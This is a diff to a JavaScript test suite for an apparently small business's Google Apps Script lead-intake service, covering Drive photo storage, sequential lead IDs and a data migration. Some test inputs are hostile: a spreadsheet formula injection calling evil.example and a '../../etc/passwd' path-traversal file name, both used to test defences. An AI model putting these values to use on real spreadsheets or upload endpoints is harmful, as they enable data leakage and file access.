@@ -295,6 +295,200 @@ function createSpreadsheet()
 }
 
 /* ============================================================
+   IN-MEMORY DRIVE MOCK
+
+   Enough of DriveApp to exercise photo storage: folders by name,
+   files by name, ids, urls, and sharing calls recorded rather than
+   performed. Iterators mimic Google's hasNext/next rather than
+   returning arrays, because the production code is written against
+   that shape and a friendlier mock would not prove it works.
+============================================================ */
+
+function createDriveIterator(items)
+{
+
+    let cursor = 0;
+
+    return {
+
+        hasNext: function () { return cursor < items.length; },
+
+        next: function ()
+        {
+
+            const item = items[cursor];
+
+            cursor += 1;
+
+            return item;
+
+        }
+
+    };
+
+}
+
+let driveIdCounter = 0;
+
+const driveSharingCalls = [];
+
+function createDriveFile(name, mimeType, bytes)
+{
+
+    driveIdCounter += 1;
+
+    const id = 'file-' + driveIdCounter;
+
+    return {
+
+        id: id,
+
+        name: name,
+
+        mimeType: mimeType,
+
+        bytes: bytes,
+
+        getId: function () { return this.id; },
+
+        getName: function () { return this.name; },
+
+        getUrl: function () { return 'https://drive.google.com/file/d/' + this.id + '/view'; },
+
+        getBlob: function () { return { bytes: this.bytes }; }
+
+    };
+
+}
+
+function createDriveFolder(name)
+{
+
+    driveIdCounter += 1;
+
+    return {
+
+        id: 'folder-' + driveIdCounter,
+
+        name: name,
+
+        files: [],
+
+        folders: [],
+
+        getId: function () { return this.id; },
+
+        getName: function () { return this.name; },
+
+        setName: function (newName) { this.name = newName; return this; },
+
+        getUrl: function () { return 'https://drive.google.com/drive/folders/' + this.id; },
+
+        getFiles: function () { return createDriveIterator(this.files.slice()); },
+
+        getFilesByName: function (wanted)
+        {
+
+            return createDriveIterator(this.files.filter(function (file)
+            {
+
+                return file.name === wanted;
+
+            }));
+
+        },
+
+        getFolders: function () { return createDriveIterator(this.folders.slice()); },
+
+        getFoldersByName: function (wanted)
+        {
+
+            return createDriveIterator(this.folders.filter(function (folder)
+            {
+
+                return folder.name === wanted;
+
+            }));
+
+        },
+
+        createFolder: function (childName)
+        {
+
+            const folder = createDriveFolder(childName);
+
+            this.folders.push(folder);
+
+            return folder;
+
+        },
+
+        createFile: function (blob)
+        {
+
+            const file = createDriveFile(blob.name, blob.mimeType, blob.bytes);
+
+            this.files.push(file);
+
+            return file;
+
+        },
+
+        setSharing: function (access, permission)
+        {
+
+            driveSharingCalls.push({ folder: this.name, access: access, permission: permission });
+
+            return this;
+
+        },
+
+        addViewer: function (emailAddress)
+        {
+
+            driveSharingCalls.push({ folder: this.name, viewer: emailAddress });
+
+            return this;
+
+        }
+
+    };
+
+}
+
+const driveRoot = { folders: [] };
+
+const scriptProperties = { MODULE_API_KEY: 'test-api-key' };
+
+/* Walks the whole tree because getFolderById does not care where a
+   folder sits, and the per-lead folders are one level down. */
+
+function findMockFolderById(id)
+{
+
+    const queue = driveRoot.folders.slice();
+
+    while (queue.length)
+    {
+
+        const folder = queue.shift();
+
+        if (folder.id === id)
+        {
+
+            return folder;
+
+        }
+
+        folder.folders.forEach(function (child) { queue.push(child); });
+
+    }
+
+    return null;
+
+}
+
+/* ============================================================
    GOOGLE SERVICE MOCKS
 ============================================================ */
 
@@ -363,11 +557,69 @@ const sandbox = {
                 getProperty: function (key)
                 {
 
-                    return (key === 'MODULE_API_KEY') ? 'test-api-key' : null;
+                    return Object.prototype.hasOwnProperty.call(scriptProperties, key)
+                        ? scriptProperties[key]
+                        : null;
+
+                },
+
+                setProperty: function (key, value)
+                {
+
+                    scriptProperties[key] = value;
+
+                    return this;
 
                 }
 
             };
+
+        }
+
+    },
+
+    DriveApp: {
+
+        Access: { ANYONE_WITH_LINK: 'ANYONE_WITH_LINK' },
+
+        Permission: { VIEW: 'VIEW' },
+
+        getFolderById: function (id)
+        {
+
+            const found = findMockFolderById(id);
+
+            if (!found)
+            {
+
+                throw new Error('No folder with id ' + id);
+
+            }
+
+            return found;
+
+        },
+
+        getFoldersByName: function (name)
+        {
+
+            return createDriveIterator(driveRoot.folders.filter(function (folder)
+            {
+
+                return folder.name === name;
+
+            }));
+
+        },
+
+        createFolder: function (name)
+        {
+
+            const folder = createDriveFolder(name);
+
+            driveRoot.folders.push(folder);
+
+            return folder;
 
         }
 
@@ -412,7 +664,21 @@ const sandbox = {
 
     Utilities: {
 
-        formatDate: function (date) { return date.toISOString(); }
+        formatDate: function (date) { return date.toISOString(); },
+
+        base64Decode: function (base64)
+        {
+
+            return Array.from(Buffer.from(String(base64), 'base64'));
+
+        },
+
+        newBlob: function (bytes, mimeType, name)
+        {
+
+            return { bytes: bytes, mimeType: mimeType, name: name };
+
+        }
 
     },
 
@@ -453,6 +719,7 @@ const moduleFiles = [
     'utilities.gs',
     'validation.gs',
     'leads.gs',
+    'photoStorage.gs',
     'notifications.gs',
     'routes.gs',
     'Code.gs'
@@ -491,7 +758,10 @@ vm.runInContext(
     + ' LEADS_HEADERS: LEADS_HEADERS,'
     + ' ERROR_LOG_HEADERS: ERROR_LOG_HEADERS,'
     + ' ENUM_VALUES: ENUM_VALUES,'
-    + ' DEFAULT_NOTIFICATION_EMAIL: DEFAULT_NOTIFICATION_EMAIL'
+    + ' DEFAULT_NOTIFICATION_EMAIL: DEFAULT_NOTIFICATION_EMAIL,'
+    + ' MAX_PHOTOS_PER_LEAD: MAX_PHOTOS_PER_LEAD,'
+    + ' MAX_PHOTO_BYTES: MAX_PHOTO_BYTES,'
+    + ' PHOTO_ROOT_FOLDER_NAME: PHOTO_ROOT_FOLDER_NAME'
     + ' };',
     sandbox
 );
@@ -538,7 +808,7 @@ function basePayload(overrides)
 
     const payload = {
 
-        leadId: 'BG-' + Date.now(),
+        referenceId: 'BG-' + Date.now(),
 
         submittedAt: new Date().toISOString(),
 
@@ -629,8 +899,18 @@ check('dashboardMetrics sheet created', Boolean(spreadsheet.getSheetByName('dash
 
 const headerRow = leadsSheet().getRange(1, 1, 1, sandbox.constants.LEADS_HEADERS.length).getValues()[0];
 
-check('leads row 1 = 27 canonical headers',
-    headerRow.length === 27 && headerRow.join(',') === sandbox.constants.LEADS_HEADERS.join(','));
+check('leads row 1 = 29 canonical headers',
+    headerRow.length === 29 && headerRow.join(',') === sandbox.constants.LEADS_HEADERS.join(','));
+
+/* The append-only rule is what keeps rows written before the
+   identifier split readable, so it is asserted rather than trusted:
+   the two columns added on 2026-08-13 must sit at the end, after
+   lastUpdated, not next to the fields they relate to. */
+
+check('referenceId and photoFolderUrl appended, not inserted',
+    sandbox.constants.LEADS_HEADERS[26] === 'lastUpdated'
+    && sandbox.constants.LEADS_HEADERS[27] === 'referenceId'
+    && sandbox.constants.LEADS_HEADERS[28] === 'photoFolderUrl');
 
 const errorHeaderRow = errorLogSheet()
     .getRange(1, 1, 1, sandbox.constants.ERROR_LOG_HEADERS.length).getValues()[0];
@@ -690,12 +970,31 @@ check('lead row written to sheet', leadsSheet().getLastRow() === 2);
 
 check('status forced to new', created.data.lead.status === 'new');
 
-check('photoUrls forced to []', Array.isArray(created.data.lead.photoUrls)
+check('photoUrls empty when nothing was uploaded', Array.isArray(created.data.lead.photoUrls)
     && created.data.lead.photoUrls.length === 0);
 
 check('lastUpdated stamped', Boolean(created.data.lead.lastUpdated));
 
-check('leadId preserved from client', created.data.lead.leadId === happyPayload.leadId);
+check('referenceId preserved from client',
+    created.data.lead.referenceId === happyPayload.referenceId);
+
+check('first lead is BG-0001', created.data.lead.leadId === 'BG-0001',
+    'got ' + created.data.lead.leadId);
+
+check('leadId is not the referenceId',
+    created.data.lead.leadId !== created.data.lead.referenceId);
+
+check('owner email shows the reference, not the internal number',
+    sentEmails[0].body.indexOf('Reference  : ' + happyPayload.referenceId) !== -1);
+
+check('owner email also carries the internal lead number',
+    sentEmails[0].body.indexOf('Lead       : BG-0001') !== -1);
+
+check('auto-reply quotes the referenceId as the confirmation number',
+    sentEmails[1].body.indexOf('Reference number  : ' + happyPayload.referenceId) !== -1);
+
+check('auto-reply never shows the sequential number',
+    sentEmails[1].body.indexOf('BG-0001') === -1);
 
 console.log('\nEMAIL — OWNER ONLY');
 
@@ -753,7 +1052,7 @@ const trapped = parse(sandbox.doPost({
 
     postData: { contents: JSON.stringify(basePayload({
 
-        leadId: 'BG-' + (Date.now() + 5),
+        referenceId: 'BG-' + (Date.now() + 5),
 
         companyWebsite: 'http://spam.example'
 
@@ -795,7 +1094,7 @@ const badAcres = parse(sandbox.doPost({
 
     postData: { contents: JSON.stringify(basePayload({
 
-        leadId: 'BG-' + (Date.now() + 9),
+        referenceId: 'BG-' + (Date.now() + 9),
 
         estimatedAcres: 'abc'
 
@@ -812,7 +1111,7 @@ const badEnum = parse(sandbox.doPost({
 
     postData: { contents: JSON.stringify(basePayload({
 
-        leadId: 'BG-' + (Date.now() + 11),
+        referenceId: 'BG-' + (Date.now() + 11),
 
         serviceNeeded: 'Underwater Basket Weaving'
 
@@ -852,7 +1151,7 @@ const mailFailLead = parse(sandbox.doPost({
 
     postData: { contents: JSON.stringify(basePayload({
 
-        leadId: 'BG-' + (Date.now() + 21)
+        referenceId: 'BG-' + (Date.now() + 21)
 
     })) }
 
@@ -874,7 +1173,7 @@ const injected = parse(sandbox.doPost({
 
     postData: { contents: JSON.stringify(basePayload({
 
-        leadId: 'BG-' + (Date.now() + 31),
+        referenceId: 'BG-' + (Date.now() + 31),
 
         fullName: '=IMPORTXML("http://evil.example","//a")'
 
@@ -929,7 +1228,7 @@ const updated = parse(sandbox.doPost({
 
     postData: { contents: JSON.stringify({
 
-        leadId: happyPayload.leadId,
+        leadId: created.data.lead.leadId,
 
         status: 'contacted',
 
@@ -949,7 +1248,7 @@ const badStatus = parse(sandbox.doPost({
 
     parameter: { action: 'leads.update', apiKey: 'test-api-key' },
 
-    postData: { contents: JSON.stringify({ leadId: happyPayload.leadId, status: 'banana' }) }
+    postData: { contents: JSON.stringify({ leadId: created.data.lead.leadId, status: 'banana' }) }
 
 }));
 
@@ -960,7 +1259,7 @@ const missingLead = parse(sandbox.doPost({
 
     parameter: { action: 'leads.update', apiKey: 'test-api-key' },
 
-    postData: { contents: JSON.stringify({ leadId: 'BG-0000000000000', status: 'lost' }) }
+    postData: { contents: JSON.stringify({ leadId: 'BG-9999', status: 'lost' }) }
 
 }));
 
@@ -971,7 +1270,7 @@ const unauthorizedUpdate = parse(sandbox.doPost({
 
     parameter: { action: 'leads.update' },
 
-    postData: { contents: JSON.stringify({ leadId: happyPayload.leadId, status: 'lost' }) }
+    postData: { contents: JSON.stringify({ leadId: created.data.lead.leadId, status: 'lost' }) }
 
 }));
 
@@ -984,6 +1283,413 @@ const unknown = parse(sandbox.doGet({ parameter: { action: 'leads.explode' } }))
 
 check('unknown action -> UNKNOWN_ACTION', unknown.success === false
     && unknown.error.code === 'UNKNOWN_ACTION');
+
+/* ============================================================
+   SEQUENTIAL LEAD NUMBERING
+============================================================ */
+
+console.log('\nSEQUENTIAL LEAD NUMBERING');
+
+/* Numbering is derived from the sheet, so these run against whatever
+   the tests above already wrote rather than against a clean sheet —
+   which is the harder and more realistic case. */
+
+function createLead(overrides)
+{
+
+    return parse(sandbox.doPost({
+
+        parameter: { action: 'leads.create' },
+
+        postData: { contents: JSON.stringify(basePayload(overrides)) }
+
+    }));
+
+}
+
+const highestSoFar = sandbox.findHighestLeadNumber(leadsSheet());
+
+const sequentialA = createLead({ referenceId: 'BG-' + (Date.now() + 101) });
+
+const sequentialB = createLead({ referenceId: 'BG-' + (Date.now() + 102) });
+
+const sequentialC = createLead({ referenceId: 'BG-' + (Date.now() + 103) });
+
+check('leadIds increment by one',
+    sandbox.parseLeadNumber(sequentialB.data.lead.leadId)
+        === sandbox.parseLeadNumber(sequentialA.data.lead.leadId) + 1
+    && sandbox.parseLeadNumber(sequentialC.data.lead.leadId)
+        === sandbox.parseLeadNumber(sequentialB.data.lead.leadId) + 1,
+    [sequentialA, sequentialB, sequentialC].map(function (r) { return r.data.lead.leadId; }).join(','));
+
+check('numbering continues from the highest already in the sheet',
+    sandbox.parseLeadNumber(sequentialA.data.lead.leadId) === highestSoFar + 1);
+
+check('every leadId is unique',
+    [sequentialA, sequentialB, sequentialC]
+        .map(function (r) { return r.data.lead.leadId; })
+        .filter(function (id, index, all) { return all.indexOf(id) === index; })
+        .length === 3);
+
+check('every referenceId is distinct from every other',
+    sequentialA.data.lead.referenceId !== sequentialB.data.lead.referenceId
+    && sequentialB.data.lead.referenceId !== sequentialC.data.lead.referenceId);
+
+check('leadId zero-padded to four digits', /^BG-\d{4}$/.test(sequentialA.data.lead.leadId),
+    sequentialA.data.lead.leadId);
+
+check('padding is a minimum, not a ceiling',
+    sandbox.padLeadNumber(1) === '0001'
+    && sandbox.padLeadNumber(42) === '0042'
+    && sandbox.padLeadNumber(9999) === '9999'
+    && sandbox.padLeadNumber(10000) === '10000'
+    && sandbox.padLeadNumber(123456) === '123456');
+
+/* The guard that stops an unmigrated sheet sending the next lead to
+   BG-1786635839699. Without it, one legacy row poisons the counter
+   for the life of the spreadsheet. */
+
+check('legacy long-form ids are not read as sequence numbers',
+    sandbox.parseLeadNumber('BG-1786635839698') === 0
+    && sandbox.parseLeadNumber('BG-0001') === 1
+    && sandbox.parseLeadNumber('BG-0042') === 42
+    && sandbox.parseLeadNumber('') === 0
+    && sandbox.parseLeadNumber('nonsense') === 0);
+
+/* ── A retry must cost nothing ── */
+
+const rowsBeforeRetry = leadsSheet().getLastRow();
+
+const retryPayload = basePayload({ referenceId: 'BG-' + (Date.now() + 111) });
+
+const firstAttempt = parse(sandbox.doPost({
+
+    parameter: { action: 'leads.create' },
+
+    postData: { contents: JSON.stringify(retryPayload) }
+
+}));
+
+const secondAttempt = parse(sandbox.doPost({
+
+    parameter: { action: 'leads.create' },
+
+    postData: { contents: JSON.stringify(retryPayload) }
+
+}));
+
+const afterRetry = createLead({ referenceId: 'BG-' + (Date.now() + 112) });
+
+check('retry writes exactly one row',
+    leadsSheet().getLastRow() === rowsBeforeRetry + 2,
+    'expected +2 rows (one retried lead, one following lead)');
+
+check('retry returns the original leadId',
+    secondAttempt.data.duplicate === true
+    && secondAttempt.data.lead.leadId === firstAttempt.data.lead.leadId);
+
+check('a duplicate consumes no sequence number',
+    sandbox.parseLeadNumber(afterRetry.data.lead.leadId)
+        === sandbox.parseLeadNumber(firstAttempt.data.lead.leadId) + 1,
+    firstAttempt.data.lead.leadId + ' then ' + afterRetry.data.lead.leadId);
+
+/* ── Concurrency ──
+   Two submissions interleaved inside the critical section. The real
+   protection is LockService, which the mock grants freely, so what is
+   provable here is the half that has to be true anyway: allocation
+   reads committed state, so it cannot hand out a number that is
+   already on the sheet. */
+
+const beforeConcurrent = sandbox.findHighestLeadNumber(leadsSheet());
+
+const allocatedFirst = sandbox.allocateNextLeadId(leadsSheet());
+
+const concurrentLead = createLead({ referenceId: 'BG-' + (Date.now() + 121) });
+
+const allocatedAfter = sandbox.allocateNextLeadId(leadsSheet());
+
+check('allocation reflects committed rows, never a stale read',
+    allocatedFirst === 'BG-' + sandbox.padLeadNumber(beforeConcurrent + 1)
+    && concurrentLead.data.lead.leadId === allocatedFirst
+    && allocatedAfter === 'BG-' + sandbox.padLeadNumber(beforeConcurrent + 2));
+
+/* ============================================================
+   PHOTO STORAGE
+============================================================ */
+
+console.log('\nPHOTO STORAGE');
+
+const onePixelPng = 'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42m'
+    + 'P8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==';
+
+function uploadPhoto(referenceId, index, fileName, overrides)
+{
+
+    const payload = {
+
+        referenceId: referenceId,
+
+        index: index,
+
+        fileName: fileName,
+
+        mimeType: 'image/jpeg',
+
+        dataBase64: onePixelPng
+
+    };
+
+    Object.keys(overrides || {}).forEach(function (key) { payload[key] = overrides[key]; });
+
+    return parse(sandbox.doPost({
+
+        parameter: { action: 'leads.addPhotos' },
+
+        postData: { contents: JSON.stringify(payload) }
+
+    }));
+
+}
+
+const photoReference = 'BG-' + (Date.now() + 201);
+
+const upload1 = uploadPhoto(photoReference, 1, 'frontField.jpg');
+
+const upload2 = uploadPhoto(photoReference, 2, 'backLot.jpg');
+
+check('photo upload succeeds', upload1.success === true, JSON.stringify(upload1.error || {}));
+
+check('upload returns a usable url', /^https:\/\/drive\.google\.com\/file\//.test(upload1.data.photo.url));
+
+check('multiple photos land in one folder', upload2.success === true);
+
+check('stored name carries its position', upload1.data.photo.name === '01-frontField.jpg'
+    && upload2.data.photo.name === '02-backLot.jpg');
+
+/* ── Idempotency: a retried upload must not store a second copy ── */
+
+const reupload = uploadPhoto(photoReference, 1, 'frontField.jpg');
+
+check('re-uploading the same photo is idempotent',
+    reupload.success === true
+    && reupload.data.duplicate === true
+    && reupload.data.photo.fileId === upload1.data.photo.fileId);
+
+/* ── The lead picks up what was actually stored ── */
+
+sentEmails.length = 0;
+
+const photoLead = createLead({
+
+    referenceId: photoReference,
+
+    photoCount: 2,
+
+    photoNames: ['frontField.jpg', 'backLot.jpg']
+
+});
+
+check('lead stores the resolved photo urls',
+    photoLead.data.lead.photoUrls.length === 2
+    && photoLead.data.lead.photoUrls[0] === upload1.data.photo.url);
+
+check('photo urls are ordered as the visitor chose them',
+    photoLead.data.lead.photoNames[0] === '01-frontField.jpg'
+    && photoLead.data.lead.photoNames[1] === '02-backLot.jpg');
+
+check('lead stores a folder url', /drive\.google\.com\/drive\/folders\//
+    .test(photoLead.data.lead.photoFolderUrl));
+
+const photoOwnerEmail = sentEmails[0];
+
+check('owner email links every photo',
+    photoOwnerEmail.body.indexOf(upload1.data.photo.url) !== -1
+    && photoOwnerEmail.body.indexOf(upload2.data.photo.url) !== -1);
+
+check('owner email names photos without the position prefix',
+    photoOwnerEmail.body.indexOf('1. frontField.jpg') !== -1
+    && photoOwnerEmail.body.indexOf('2. backLot.jpg') !== -1);
+
+check('owner email offers the whole folder',
+    photoOwnerEmail.body.indexOf(photoLead.data.lead.photoFolderUrl) !== -1);
+
+check('owner HTML email carries real anchors',
+    photoOwnerEmail.htmlBody.indexOf('<a href="' + upload1.data.photo.url) !== -1);
+
+/* The defect this whole feature exists to remove: an email that names
+   a photo the owner cannot open. */
+
+check('owner email no longer says photos are not uploaded',
+    photoOwnerEmail.body.indexOf('photos are not uploaded yet') === -1
+    && photoOwnerEmail.htmlBody.indexOf('recorded by name only') === -1);
+
+check('the folder was renamed to carry the lead number',
+    Boolean(findMockFolderById(photoLead.data.lead.photoFolderUrl.split('/').pop()))
+    && findMockFolderById(photoLead.data.lead.photoFolderUrl.split('/').pop())
+        .getName().indexOf(photoLead.data.lead.leadId) === 0);
+
+check('folder shared with the notification recipient by default',
+    driveSharingCalls.some(function (call) { return call.viewer === 'Bluegridls@gmail.com'; }));
+
+check('nothing was shared publicly',
+    !driveSharingCalls.some(function (call) { return call.access === 'ANYONE_WITH_LINK'; }));
+
+/* ── A lead whose photos never arrived must say so ── */
+
+sentEmails.length = 0;
+
+const noPhotoLead = createLead({
+
+    referenceId: 'BG-' + (Date.now() + 211),
+
+    photoCount: 3,
+
+    photoNames: ['a.jpg', 'b.jpg', 'c.jpg']
+
+});
+
+check('lead still succeeds when no photo reached storage', noPhotoLead.success === true);
+
+check('owner told plainly that the upload did not complete',
+    sentEmails[0].body.indexOf('UPLOAD DID NOT COMPLETE') !== -1
+    && sentEmails[0].body.indexOf('a.jpg') !== -1);
+
+/* ── Public endpoint, so its gates are the control ── */
+
+const badMime = uploadPhoto('BG-' + (Date.now() + 221), 1, 'notes.pdf', {
+
+    mimeType: 'application/pdf'
+
+});
+
+check('non-image upload rejected', badMime.success === false
+    && Boolean(badMime.error.fields.mimeType));
+
+const staleReference = uploadPhoto('BG-' + (Date.now() - (48 * 60 * 60 * 1000)), 1, 'old.jpg');
+
+check('expired reference rejected', staleReference.success === false
+    && Boolean(staleReference.error.fields.referenceId));
+
+const malformedReference = uploadPhoto('BG-not-a-reference', 1, 'x.jpg');
+
+check('malformed reference rejected', malformedReference.success === false
+    && Boolean(malformedReference.error.fields.referenceId));
+
+const oversized = uploadPhoto('BG-' + (Date.now() + 231), 1, 'huge.jpg', {
+
+    dataBase64: 'A'.repeat(Math.ceil(sandbox.constants.MAX_PHOTO_BYTES * 4 / 3) + 1024)
+
+});
+
+check('oversized upload rejected', oversized.success === false
+    && Boolean(oversized.error.fields.dataBase64));
+
+const traversalReference = 'BG-' + (Date.now() + 241);
+
+const traversal = uploadPhoto(traversalReference, 1, '../../etc/passwd.jpg');
+
+check('path separators stripped from the stored name',
+    traversal.success === true
+    && traversal.data.photo.name.indexOf('/') === -1
+    && traversal.data.photo.name.indexOf('\\') === -1,
+    traversal.success ? traversal.data.photo.name : JSON.stringify(traversal.error));
+
+const capReference = 'BG-' + (Date.now() + 251);
+
+let capRejected = false;
+
+for (let photoIndex = 1; photoIndex <= sandbox.constants.MAX_PHOTOS_PER_LEAD + 2; photoIndex += 1)
+{
+
+    const attempt = uploadPhoto(capReference, photoIndex, 'photo' + photoIndex + '.jpg');
+
+    if (!attempt.success)
+    {
+
+        capRejected = true;
+
+    }
+
+}
+
+check('per-lead photo cap enforced server-side', capRejected);
+
+check('cap stopped the folder at the limit',
+    sandbox.countFolderFiles(sandbox.getLeadPhotoFolder(capReference, false))
+        === sandbox.constants.MAX_PHOTOS_PER_LEAD);
+
+/* ============================================================
+   IDENTIFIER MIGRATION
+============================================================ */
+
+console.log('\nIDENTIFIER MIGRATION');
+
+/* A pre-split row, written the way the old code wrote it: long id in
+   the leadId column, referenceId empty. */
+
+const legacyReference = 'BG-1786635839698';
+
+const legacySheet = leadsSheet();
+
+const legacyRowNumber = legacySheet.getLastRow() + 1;
+
+const legacyRow = sandbox.constants.LEADS_HEADERS.map(function (header)
+{
+
+    if (header === 'leadId') { return legacyReference; }
+
+    if (header === 'fullName') { return 'Legacy Row'; }
+
+    if (header === 'status') { return 'new'; }
+
+    return '';
+
+});
+
+legacySheet.appendRow(legacyRow);
+
+const rowsBeforeMigration = legacySheet.getLastRow();
+
+const previewOutput = sandbox.previewLeadIdentifierMigration();
+
+check('preview reports the legacy row', previewOutput.indexOf(legacyReference) !== -1);
+
+check('preview writes nothing',
+    legacySheet.getRange(legacyRowNumber, 1, 1, 1).getValues()[0][0] === legacyReference
+    && legacySheet.getLastRow() === rowsBeforeMigration);
+
+const migrationOutput = sandbox.migrateLeadIdentifiers();
+
+const migratedRecord = sandbox.findLeadByReferenceId(legacySheet, legacyReference);
+
+check('migration moved the long id into referenceId',
+    Boolean(migratedRecord) && migratedRecord.record.referenceId === legacyReference);
+
+check('migration gave the row a sequential leadId',
+    Boolean(migratedRecord) && sandbox.isValidLeadId(migratedRecord.record.leadId),
+    migratedRecord ? migratedRecord.record.leadId : 'not found');
+
+check('migration deleted no rows', legacySheet.getLastRow() === rowsBeforeMigration);
+
+check('migration preserved the rest of the row',
+    Boolean(migratedRecord) && migratedRecord.record.fullName === 'Legacy Row');
+
+check('migration reported what it did', migrationOutput.indexOf('MIGRATION APPLIED') !== -1);
+
+/* Idempotence matters more here than anywhere else: someone will run
+   this twice. */
+
+const afterFirstMigration = sandbox.findLeadByReferenceId(legacySheet, legacyReference).record.leadId;
+
+sandbox.migrateLeadIdentifiers();
+
+check('re-running the migration changes nothing',
+    sandbox.findLeadByReferenceId(legacySheet, legacyReference).record.leadId === afterFirstMigration
+    && legacySheet.getLastRow() === rowsBeforeMigration);
+
+check('a migrated sheet still numbers new leads correctly',
+    sandbox.parseLeadNumber(createLead({ referenceId: 'BG-' + (Date.now() + 301) })
+        .data.lead.leadId) > 0);
 
 console.log('\nBUILT-IN SELF TEST');
 
